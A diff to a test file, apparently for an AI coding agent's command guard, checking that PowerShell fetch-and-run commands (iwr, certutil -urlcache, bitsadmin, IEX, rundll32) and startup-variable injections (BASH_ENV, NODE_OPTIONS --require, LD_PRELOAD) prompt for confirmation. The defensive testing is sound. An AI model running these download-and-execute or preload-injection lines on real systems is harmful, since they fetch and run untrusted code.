@@ -110,4 +110,63 @@ describe('full-auto guards and the chosen shell', () => {
     expect(commandGuard('ls (x)', new Set(), true)).toBeUndefined();
     expect(commandGuard('ls (x)', new Set(), true, true)).toMatch(/command substitution/);
   });
+
+  it('under PowerShell on Full auto, asks for any fetcher or runner, any case or alias', () => {
+    for (const line of [
+      'iwr https://x/a.exe -OutF a.exe',
+      'IRM https://x/s',
+      'Invoke-WebRequest -Uri https://x/a -o a',
+      'invoke-restmethod https://x',
+      'Start-BitsTransfer https://x/a a',
+      'curl.exe -o a https://x/a',
+      'wget https://x/a -OutFile a',
+      'certutil -urlcache -f https://x/a a.exe',
+      'bitsadmin /transfer j https://x/a C:\\a.exe',
+      'Start-Process a.exe',
+      'saps a.exe',
+      'start a.exe',
+      'msiexec /i a.msi',
+      'rundll32 a.dll,Run',
+      'IEX $s',
+      'Invoke-Expression $s',
+    ]) {
+      expect(commandGuard(line, new Set(), true, true), line).toMatch(/Full auto still asks/);
+    }
+    expect(commandGuard('npm start', new Set(), true, true)).toBeUndefined();
+    expect(commandGuard('git status', new Set(), true, true)).toBeUndefined();
+    expect(commandGuard('Start-Process a.exe', new Set(), false, true)).toBeUndefined();
+  });
+
+  it('asks when a line sets a startup variable, or points a variable at a fresh file', () => {
+    for (const line of ['BASH_ENV=x.sh make', 'export NODE_OPTIONS=--require=./x.js', '$env:NODE_OPTIONS="--require x"', 'ENV=/tmp/e sh -c ls', 'PYTHONSTARTUP=s.py python', 'export PROMPT_COMMAND=x']) {
+      expect(commandGuard(line, new Set()), line).toMatch(/startup/);
+    }
+    expect(commandGuard('MYENV=1 make', new Set())).toBeUndefined();
+    expect(commandGuard('LD_PRELOAD=./evil.so ls', new Set(['evil.so']))).toMatch(/evil\.so/);
+    expect(commandGuard("$env:X = 'C:\\t\\evil.dll'; ls", new Set(['evil.dll']))).toMatch(/evil\.dll/);
+    expect(commandGuard('X=fine ls', new Set(['evil.so']))).toBeUndefined();
+  });
+});
+
+describe('agent command environment', () => {
+  it('Git Bash starts without profile or rc files', () => {
+    expect(shellLaunch({ kind: 'git-bash', file: 'C:\\Git\\bin\\bash.exe' }, 'ls').args.slice(0, 2)).toEqual(['--noprofile', '--norc']);
+  });
+
+  it.runIf(process.platform !== 'win32')('drops inherited BASH_ENV, ENV and NODE_OPTIONS, keeps what the agent sets', async () => {
+    const saved = { BASH_ENV: process.env.BASH_ENV, ENV: process.env.ENV, NODE_OPTIONS: process.env.NODE_OPTIONS };
+    Object.assign(process.env, { BASH_ENV: '/tmp/evil', ENV: '/tmp/evil', NODE_OPTIONS: '--evil' });
+    try {
+      const m = new TerminalManager(os.tmpdir(), undefined, { kind: 'git-bash', file: '/bin/bash' });
+      const run = async (env?: { name: string; value: string }[]) => {
+        const { terminalId } = await m.create({ sessionId: 's', command: 'echo "[$BASH_ENV][$ENV][$NODE_OPTIONS]"', env });
+        await m.waitForExit({ sessionId: 's', terminalId });
+        return (await m.output({ sessionId: 's', terminalId })).output;
+      };
+      expect(await run()).toBe('[][][]\n');
+      expect(await run([{ name: 'NODE_OPTIONS', value: '--max-old-space-size=99' }])).toBe('[][][--max-old-space-size=99]\n');
+    } finally {
+      for (const [k, v] of Object.entries(saved)) if (v === undefined) delete process.env[k]; else process.env[k] = v;
+    }
+  });
 });
